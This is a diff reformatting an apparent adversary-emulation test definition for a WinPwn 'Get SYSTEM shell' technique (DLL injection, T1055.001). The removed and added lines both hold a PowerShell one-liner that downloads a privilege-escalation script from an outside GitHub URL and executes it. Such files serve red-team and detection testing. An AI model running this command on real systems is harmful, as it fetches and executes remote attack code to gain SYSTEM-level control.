@@ -1,12 +1,15 @@
-- id: 43f39b3c-c4ef-5bf5-b860-30d006b53b15
+- requirements: []
   name: Soumaia ART Tests - WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique
   description: Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn
   tactic: stealth
-  technique:
-    attack_id: T1055.001
-    name: 'Process Injection: Dynamic-link Library Injection'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
+  technique_id: T1055.001
+  technique_name: 'Process Injection: Dynamic-link Library Injection'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
+  id: 43f39b3c-c4ef-5bf5-b860-30d006b53b15
